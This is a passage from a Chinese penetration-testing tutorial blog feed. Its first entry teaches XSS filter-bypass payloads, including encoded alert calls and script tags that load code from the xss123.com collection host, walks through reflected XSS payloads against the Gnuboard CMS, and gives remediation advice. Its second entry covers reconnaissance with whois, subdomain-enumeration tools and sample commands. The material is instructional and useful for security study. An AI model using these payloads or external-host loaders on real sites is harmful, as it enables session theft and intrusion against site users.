src=http://www.xss123.com/JGdbsl?1623638390&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure><h3 id="过滤-alert"><a class="markdownIt-Anchor" href="#过滤-alert">#</a> 过滤 alert</h3><p>当页面过滤 alert 这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行 过滤，而且很多 waf 都会对其进行拦截。所以不存在 alert 即可；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br><span class="line">&lt;script src=http://www.xss123.com/eciAKj?1623635663&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="过滤标签"><a class="markdownIt-Anchor" href="#过滤标签">#</a> 过滤标签</h3><p>在程序里如果使用 html 实体过滤，在 php 会使用 htmlspecialchars () 对输入的字符进行实体化，实体化之后的字符不会在 html 执行。把预定义的字符 “&lt;” （小于） 和 “&gt;” （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用 &lt; 或 者 &gt;，这两个字符被实体化后在 html 里就不能执行了；</p><p>预定义的字符是：</p><ul><li><ul><li><pre><code>  &amp; (和号)成为 &amp;amp;   &quot; (双引号)成为 &amp;quot;  ' (单引号)成为 &amp;#039;  &lt; (小于)成为 &amp;lt;  &gt;(大于)成为 &amp;gt;    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![img](https://cdn.nlark.com/yuque/0/2021/png/2336202/1631674464484-8bc1b864-2b11-4fb5-9201-22dfc83049d3.png)</span><br><span class="line"></span><br><span class="line"> 但是有在 input 这些标签里是不用考虑标签实体化，因为用不上&lt;&gt;这两个标签：</span><br><span class="line"></span><br><span class="line">```plain</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; onclick=&quot;javascript:alert(&#x27;xss&#x27;);&quot;/&gt;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631674560015-cfc2b497-9f84-4026-b2ea-ed55a4a5c598.png" alt="img"></p><h3 id="ascii-编码"><a class="markdownIt-Anchor" href="#ascii-编码">#</a> ascii 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;    </span><br><span class="line">//fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</span><br></pre></td></tr></table></figure><h3 id="url-编码"><a class="markdownIt-Anchor" href="#url-编码">#</a> url 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="js-编码"><a class="markdownIt-Anchor" href="#js-编码">#</a> JS 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">八进制编码</span><br><span class="line">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\61\51&quot;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">16 进制编码</span><br><span class="line">&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">jsunicode 编码</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#x27;xss&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="html-编码"><a class="markdownIt-Anchor" href="#html-编码">#</a> HTML 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在=后可以解析 html 编码</span><br><span class="line"></span><br><span class="line">十进制</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot; /&gt;</span><br><span class="line">&lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">十六进制</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><h3 id="base64-编码"><a class="markdownIt-Anchor" href="#base64-编码">#</a> base64 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用伪协议 base64 解码执行 xss </span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;111&lt;/a&gt;</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h3 id="构造事件绕过"><a class="markdownIt-Anchor" href="#构造事件绕过">#</a> 构造事件绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果不能依靠属性进行跨站，那么还可以利用事件处理函数: </span><br><span class="line">&lt;input type = &quot;button&quot;  value = &quot;clickme&quot; οnclick=&quot;alert(&#x27;click me&#x27;)&quot; /&gt; </span><br><span class="line">事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数; </span><br><span class="line"></span><br><span class="line">  最后还可以使用fuzz大法去做模糊测试，然后构造payload,更事半功倍！</span><br></pre></td></tr></table></figure><p>更多绕过方式参考：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9kM2FkZW5kLm9yZy94c3MvZ2hldHRvQnlwYXNz">https://d3adend.org/xss/ghettoBypass</span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvdG9vbHMveHNzLmh0bQ==">https://www.jb51.net/tools/xss.htm</span></li></ul></li></ul><h1 id="xss-项目实战挖掘-cms-xss-漏洞"><a class="markdownIt-Anchor" href="#xss-项目实战挖掘-cms-xss-漏洞">#</a> xss 项目实战挖掘 cms xss 漏洞</h1><p>Gnuboard 是韩国 Sir 公司开发一套 PHP+Mysql 可扩展论坛程序。将主程序与 Skin （风格文件）完全剥离，通过 skin 的编辑可以制作人才就业网站、房产信息平 台、供求信息发布、甚至可以作为企业产品展示。</p><p>项目地址：</p><p>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXd3ZktVWHVSS3VNOGpDR1hOVHBjZ2c=">https://pan.baidu.com/s/1wwfKUXuRKuM8jCGXNTpcgg</span> 提取码：vai0</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631677103075-fc2c3442-481c-4252-a18a-96755d3af824.png" alt="img"></p><p>挖掘 xss 漏洞 寻找可控参数，输入标签，右键查看源码，是否有队输入的内容 过滤。如果存在标签过滤，则尝试绕过过滤，没有过滤的情况下，构造而已代码 即可。</p><h3 id="反射型-xss-漏洞一"><a class="markdownIt-Anchor" href="#反射型-xss-漏洞一">#</a> 反射型 xss 漏洞一</h3><p>首页直接尝试检测</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631677289732-3592b59c-de3c-48ea-963b-c04ab471c294.png" alt="img"></p><p>没有闭合尖括号，直接构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631677368446-076b4fbd-f81f-4ff2-bfb0-fdf4d9287a91.png" alt="img"></p><h3 id="反射型-xss-漏洞二"><a class="markdownIt-Anchor" href="#反射型-xss-漏洞二">#</a> 反射型 xss 漏洞二</h3><p>在登录用户处，尝试登录抓包仔细查看返回内容。查看是否有相同点；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631678410583-a8125000-7b59-4b6e-a07c-4acd0baf6910.png" alt="img"></p><p>document.location.replace 这个 js 的意思 载入新文档替换当前页面；</p><p>同样可以用双引号闭合语句执行恶意语句；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(&#x27;xss&#x27;);//</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631684085835-f2eb85c5-a607-46c2-a2c0-8985a97f2915.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631678627439-6836b7f6-0bb7-4faa-a755-9e277dfbfb21.png" alt="img"></p><h1 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复">#</a> 漏洞修复</h1><ul><li><p>输入检查</p></li><li><ul><li>白名单</li><li>同时在客户端 javascript 中和服务端代码中实现相同的输入检查</li></ul></li><li><p>输出检查</p></li><li><ul><li>HTML 编码</li><li>JS 转义</li></ul></li><li><p>HttpOnly</p></li><li><ul><li>浏览器禁止页面的 javascript 访问带有 httponly 属性的 cookie。httponly 解决的是 XSS 后的 cookie 攻击</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-漏洞介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss-漏洞介绍&quot;&gt;#&lt;/a&gt; xss 漏洞介绍&lt;/h1&gt;
&lt;p&gt;XSS 攻击全称跨站脚本攻击，系统将用户输入的值当作为 html 的语句进行执行，从而产生 XSS 攻击，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/02/23/%E4%BF%AE%E6%94%B9/2.2.2%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://sun-spots.github.io/2022/02/23/%E4%BF%AE%E6%94%B9/2.2.2%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2022-02-23T01:52:40.876Z</published>
    <updated>2022-02-25T01:07:54.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二天资产信息收集"><a class="markdownIt-Anchor" href="#第二天资产信息收集">#</a> 第二天：资产信息收集</h1><h2 id="img"><a class="markdownIt-Anchor" href="#img">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627292293167-5c4f90cd-7fe0-4569-8171-6a1c302009ac.png" alt="img"></h2><h1 id="信息收集简介"><a class="markdownIt-Anchor" href="#信息收集简介">#</a> 信息收集简介</h1><p>信息搜集也称踩点，信息搜集毋庸置疑就是尽可能的搜集目标的信息，包括端口信息、DNS 信息、员工邮箱等等看似并不起眼的一些信息都算是信息搜集，这些看似微乎其微的信息，对于渗透测试而言就关乎到成功与否了。</p><p>信息搜集的重要性：</p><p>信息搜集是渗透测试的最重要的阶段，占据整个渗透测试的 60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。</p><h1 id="信息搜集的分类"><a class="markdownIt-Anchor" href="#信息搜集的分类">#</a> 信息搜集的分类</h1><p>1、主动式信息搜集（可获取到的信息较多，但易被目标发现）</p><p>2、通过直接发起与被测目标网络之间的互动来获取相关信息，如通过 Nmap 扫描目标系统。</p><p>3、被动式信息搜集（搜集到的信息较少，但不易被发现）</p><p>4、通过第三方服务来获取目标网络相关信息。如通过搜索引擎方式来搜集信息。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625734748286-f51f6eca-bc13-494c-a361-7f78131b717d.png" alt="img"></p><h1 id="什么是资产"><a class="markdownIt-Anchor" href="#什么是资产">#</a> 什么是资产？</h1><p>资产是指由企业过去的交易或事项形成的、由企业拥有或者控制的、预期会给企业带来经济利益的资源，而渗透测试中的资产指的则是网站的架构、ip、设备型号 (如果有的话)、网络拓扑 (多用于内网) 等等。</p><p>为什么需要资产收集？</p><p>在实际渗透测试的过程中，我们需要对企业的资产进行梳理，但是往往在渗透测试过程中，客户通常会给我们一个主域名，此时资产收集就显得尤为重要了。</p><p>随着企业内部业务的不断壮大，各种业务平台和管理系统越来越多，很多单位往往存在着 “隐形资产”，这些 “隐形资产” 通常被管理员所遗忘，长时间无人维护，导致存在较多的已知漏洞。</p><h1 id="资产收集的重要性"><a class="markdownIt-Anchor" href="#资产收集的重要性">#</a> 资产收集的重要性</h1><p>在渗透测试中，我们需要尽可能多的去收集目标的信息。资产探测和信息收集，决定了你发现安全漏洞的几率有多大。如何最大化的去收集目标范围，尽可能的收集到子域名及相关域名的信息，这对我们进一步的渗透测试很重要。</p><p>所谓资产收集就是从主域名出发，尽可能去收集关于该主域名的一切信息，如子域名、相关域名（旁站、C 端）、移动端、行业系统…</p><h1 id="域名"><a class="markdownIt-Anchor" href="#域名">#</a> 域名</h1><h2 id="备案信息"><a class="markdownIt-Anchor" href="#备案信息">#</a> 备案信息</h2><p>通过查询备案信息，我们可以获取到该企业的一些基本信息：网站地址，网站域名等；</p><h3 id="工信部网站备案查询"><a class="markdownIt-Anchor" href="#工信部网站备案查询">#</a> 工信部网站备案查询</h3><p>网站：<span class="exturl" data-url="aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbi8jL0ludGVncmF0ZWQvaW5kZXg=">https://beian.miit.gov.cn/#/Integrated/index</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296122689-9c498d95-ba74-4430-8a92-3ac83da0dbdd.png" alt="img"></p><p>通常情况下可以在网站的最底部，或者在 F12 内查看一个网站的备案号，查询备案号的方式有两种：</p><ul><li><ul><li>通过页面显示的备案号直接进行查询：</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296216035-c2fb33e8-04e4-41a8-8ea8-39fb1ddc11b1.png" alt="img"></p><ul><li><ul><li>通过公司名称进行查询：</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296273672-60650d2c-9591-4686-a55c-02a9b254bd57.png" alt="img"></p><h3 id="天眼查网站备案查询"><a class="markdownIt-Anchor" href="#天眼查网站备案查询">#</a> 天眼查网站备案查询</h3><p>网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v">https://www.tianyancha.com/</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296467941-e0cbccd4-c6fb-4a95-96d7-29926efa9591.png" alt="img"></p><p>在知识产权 — 域名备案下查询：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296591277-00839663-6b10-413f-957a-5de115d87469.png" alt="img"></p><h3 id="国家企业信用信息公示系统"><a class="markdownIt-Anchor" href="#国家企业信用信息公示系统">#</a> 国家企业信用信息公示系统</h3><p>网站：<span class="exturl" data-url="aHR0cDovL3d3dy5nc3h0Lmdvdi5jbi9pbmRleC5odG1s">http://www.gsxt.gov.cn/index.html</span></p><h3 id="img域名助手备案信息查询"><a class="markdownIt-Anchor" href="#img域名助手备案信息查询">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296725724-7084d9f0-a13a-411f-a667-a61607bb1cb9.png" alt="img"> 域名助手备案信息查询</h3><p>地址：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628045242894-7cd773d6-1c39-461c-a089-801789bba719.png" alt="img"></p><p>PS：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。</p><h2 id="whois"><a class="markdownIt-Anchor" href="#whois">#</a> whois</h2><p><em>whois</em>（读作 “<em>Who is</em>”，非缩写）是用来查询域名的 IP 以及所有者等信息的传输协议。简单说，<em>whois</em> 就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的<strong>数据库</strong>（如域名所有人、域名注册商）。通过<em> whois</em> 来实现对域名信息的查询。</p><p><span class="exturl" data-url="aHR0cDovL3huLS13aG8tb2s2ZXo5Z3RzMWUuaXM=">国外的 who.is</span>：<span class="exturl" data-url="aHR0cHM6Ly93aG8uaXMv">https://who.is/</span></p><p>站长之家：<span class="exturl" data-url="aHR0cDovL3dob2lzLmNoaW5hei5jb20v">http://whois.chinaz.com/</span></p><p>爱站：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5haXpoYW4uY29tLw==">https://whois.aizhan.com/</span></p><p>微步：<span class="exturl" data-url="aHR0cHM6Ly94LnRocmVhdGJvb2suY24v">https://x.threatbook.cn/</span></p><p>腾讯云：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5jbG91ZC50ZW5jZW50LmNvbS8=">https://whois.cloud.tencent.com/</span></p><p>美橙互联：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5jbmRucy5jb20v">https://whois.cndns.com/</span></p><p>爱名网：<span class="exturl" data-url="aHR0cHM6Ly93d3cuMjIuY24vZG9tYWluLw==">https://www.22.cn/domain/</span></p><p>易名网：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5lbmFtZS5uZXQv">https://whois.ename.net/</span></p><p>中国万网：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5hbGl5dW4uY29tLw==">https://whois.aliyun.com/</span></p><p>西部数码：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy53ZXN0LmNuLw==">https://whois.west.cn/</span></p><p>新网域名：<span class="exturl" data-url="aHR0cDovL3dob2lzLnhpbm5ldC5jb20vZG9tYWluL3dob2lzL2luZGV4LmpzcA==">http://whois.xinnet.com/domain/whois/index.jsp</span></p><p>纳网域名：<span class="exturl" data-url="aHR0cDovL3dob2lzLm5hd2FuZy5jbi8=">http://whois.nawang.cn/</span></p><p>中资源域名：<span class="exturl" data-url="aHR0cHM6Ly93d3cuenp5LmNuL2RvbWFpbi93aG9pcy5odG1s">https://www.zzy.cn/domain/whois.html</span></p><p>三五互联域名：<span class="exturl" data-url="aHR0cHM6Ly9jcC4zNS5jb20vY2hpbmVzZS93aG9pcy5waHA=">https://cp.35.com/chinese/whois.php</span></p><p>新网互联域名：<span class="exturl" data-url="aHR0cDovL3d3dy5kbnMuY29tLmNuL3Nob3cvZG9tYWluL3dob2lzL2luZGV4LmRv">http://www.dns.com.cn/show/domain/whois/index.do</span></p><p>通过 whois 查询我们可以查询到注册商、注册人、邮件、DNS 解析服务器、注册人联系电话等信息；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296992960-be09dbbb-94f2-434b-899a-fa52d7e423d0.png" alt="img"></p><p>同样也可进行 whois 反查，查找更多相关信息；</p><h2 id="子域名查询"><a class="markdownIt-Anchor" href="#子域名查询">#</a> 子域名查询</h2><h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h3><p>什么是子域名？为什么收集子域名？</p><p>域名分为根域名和子域名：</p><p><span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbQ==">baidu.com</span> 根域名顶级域名</p><p>www.baidu.com 子域名也叫二级域名</p><p><span class="exturl" data-url="aHR0cDovL3d3dy53aWtpLmJhaWR1LmNvbQ==">www.wiki.baidu.com</span>  子域名也叫三级域名四级如此类推</p><p>假设目标资产数量庞大，一般来说主域都是防护重点，管理上可能会谨慎，防护也相对严格，因此从子域名入手便成了很好的选择，子域往往在防护上会相对更加的松懈，然后再慢慢向目标系统渗透，所以子域名的收集便显得尤为的重要；</p><p>通常，一台服务器上有很多个站点，这些站点之间没有必然的联系，是相互独立的，使用的是不同的域名（甚至端口都不同），但是它们却共存在一台服务器上</p><h3 id="工具枚举爬虫"><a class="markdownIt-Anchor" href="#工具枚举爬虫">#</a> 工具枚举 &amp; 爬虫</h3><p>layer 子域名挖掘机</p><p>OneForAll</p><p>subDomainsBrute</p><h4 id="layer子域名挖掘机"><a class="markdownIt-Anchor" href="#layer子域名挖掘机">#</a> layer 子域名挖掘机</h4><p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V1cGhyYXQxY2EvTGF5ZXJEb21haW5GaW5kZXI=">https://github.com/euphrat1ca/LayerDomainFinder</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627301186393-3d9134eb-063a-4594-8e3b-7fb9a2694c37.png" alt="img"></p><h4 id="oneforall"><a class="markdownIt-Anchor" href="#oneforall">#</a> OneForAll</h4><p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=">https://github.com/shmilylty/OneForAll</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627301513430-8efaec9e-d294-4807-95e1-6e3cf50b65e6.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--alive=True</span><br><span class="line">可选值True，False分别表示导出存活，全部子域结果</span><br><span class="line">--dns=DNS</span><br><span class="line">        DNS解析子域(默认True)</span><br><span class="line">--req=REQ</span><br><span class="line">        HTTP请求子域(默认True)</span><br><span class="line">--port=PORT</span><br><span class="line">        请求验证子域的端口范围(默认只探测80端口)</span><br><span class="line">--fmt=FMT</span><br><span class="line">        结果保存格式(默认csv)</span><br><span class="line">--path=PATH</span><br><span class="line">        结果保存路径(默认None)</span><br><span class="line">--takeover=TAKEOVER</span><br><span class="line">        检查子域接管(默认False)</span><br></pre></td></tr></table></figure><h4 id="subdomainsbrute"><a class="markdownIt-Anchor" href="#subdomainsbrute">#</a> subDomainsBrute</h4><p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==">https://github.com/lijiejie/subDomainsBrute</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627302086622-01096d1f-17f0-4cfb-8c96-80911462ef2c.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//参数介绍：</span><br><span class="line"></span><br><span class="line">--version //显示程序的版本号并退出</span><br><span class="line"></span><br><span class="line">-h, --help //显示此帮助信息并退出</span><br><span class="line"></span><br><span class="line">-f FILE   //文件包含新行分隔的子文件，默认为子域名称.txt。</span><br><span class="line"></span><br><span class="line">--full //全扫描，将使用NAMES FILE subnames_full.txt 野蛮</span><br><span class="line"></span><br><span class="line">-i, --ignore-intranet     //忽略指向私有 IP 的域</span><br><span class="line"></span><br><span class="line">-w, --wildcard //通配符测试失败后强制扫描</span><br><span class="line"></span><br><span class="line">-t 线程，--threads=线程</span><br><span class="line">//扫描线程数，默认256</span><br><span class="line">      </span><br><span class="line">-p 进程, --process=进程</span><br><span class="line">//扫描进程数，默认为6</span><br><span class="line">      </span><br><span class="line">-o 输出, --output=OUTPUT</span><br><span class="line">//输出文件名。 默认为 &#123;target&#125;.txt</span><br><span class="line">python3 subDomainsBrute.py baidu.com --full -i -t 30 -o baidu.txt</span><br><span class="line"></span><br><span class="line">//结果将输出到 &quot;tmp/(域名_时间)/baidu.txt&quot; 文件内</span><br></pre></td></tr></table></figure><h3 id="网站查询搜索引擎查询"><a class="markdownIt-Anchor" href="#网站查询搜索引擎查询">#</a> 网站查询 &amp; 搜索引擎查询</h3><h4 id="网站查询"><a class="markdownIt-Anchor" href="#网站查询">#</a> 网站查询</h4><p>DNSDB：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkYi5pby96aC1jbi8=">https://dnsdb.io/zh-cn/</span></p><p>在线子域名查询：<span class="exturl" data-url="aHR0cHM6Ly9waHBpbmZvLm1lL2RvbWFpbi8=">https://phpinfo.me/domain/</span></p><p>ip 或域名查询：<span class="exturl" data-url="aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=">https://site.ip138.com/</span></p><p>子域名扫描：<span class="exturl" data-url="aHR0cHM6Ly93d3cudDFoMnVhLmNuL3Rvb2xzLw==">https://www.t1h2ua.cn/tools/</span></p><p>Aleax 网站：<span class="exturl" data-url="aHR0cHM6Ly9hbGV4YS5jaGluYXouY29tLw==">https://alexa.chinaz.com/</span></p><p>securitytrails：<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20vbGlzdC9hcGV4X2RvbWFpbi93d3cuYmFpZHUuY29t">https://securitytrails.com/list/apex_domain/www.baidu.com</span></p><p>dns 侦测：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v">https://dnsdumpster.com/</span></p><h4 id="搜索引擎查询"><a class="markdownIt-Anchor" href="#搜索引擎查询">#</a> 搜索引擎查询</h4><p>原理：通过搜索引擎获取已经爬取的子域名；</p><p>语法：site:360.cn</p><p>使用 &quot;-&quot; 减号来去除已知子域名：site:target.com-www-blog</p><p>相关工具：</p><ul><li><ul><li>theHarvester</li></ul></li></ul><h4 id="theharvesterkali自带"><a class="markdownIt-Anchor" href="#theharvesterkali自带">#</a> theHarvester（kali 自带）</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627353647646-26b947a2-2f09-4615-831c-d01cfe6e0757.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-d：搜索的域或公司名称</span><br><span class="line">-b：数据来源（google、bing、bingapi、pgp、linkedin、google-profiles、baidu、jigsaw、all）</span><br><span class="line">-s：结果编号从X开始（默认为0）</span><br><span class="line">-v：通过dns解析验证主机名，并搜索虚拟主机</span><br><span class="line">-f：将结果保存到HTML和XML文件中</span><br><span class="line">-n：对所有发现的地址范围进行DNS反向查询</span><br><span class="line">-c：对域名执行DNS强力解析</span><br><span class="line">-t：执行DNS TLD扩展发现</span><br><span class="line">-e：指定DNS服务器</span><br><span class="line">-l：限制结果数量（pgp不使用此选项）</span><br><span class="line">-h：使用SHODAN数据库查询已发现的主机</span><br><span class="line">//例子：</span><br><span class="line">theHarvester -d microsoft.com -l 500 -b google</span><br><span class="line">theHarvester -d microsoft.com -b all</span><br><span class="line">theHarvester -d microsoft -l 200 -b linkedin</span><br></pre></td></tr></table></figure><h3 id="空间引擎"><a class="markdownIt-Anchor" href="#空间引擎">#</a> 空间引擎</h3><p>Fofa：domain=“<span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbQ==">baidu.com</span>”</p><p>Zoomeye：site:baidu.com</p><p>Shodan：hostname:“<span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbQ==">baidu.com</span>”</p><h3 id="https证书透明度"><a class="markdownIt-Anchor" href="#https证书透明度">#</a> HTTPS 证书透明度</h3><p>谷歌 Chrome 要求 2017 年所有 SSL 证书都要支持证书透明，所以可以根据 CT log 查询支持 HTTPS 网站的子域名；</p><ul><li><p>crtsh：<span class="exturl" data-url="aHR0cHM6Ly9jcnQuc2gv">https://crt.sh/</span></p></li><li><p>facebook：<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9jdA==">https://developers.facebook.com/tools/ct</span></p></li><li><p>entrust：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZW50cnVzdC5jb20vY3Qtc2VhcmNoLw==">https://www.entrust.com/ct-search/</span></p></li><li><p>certspotter：<span class="exturl" 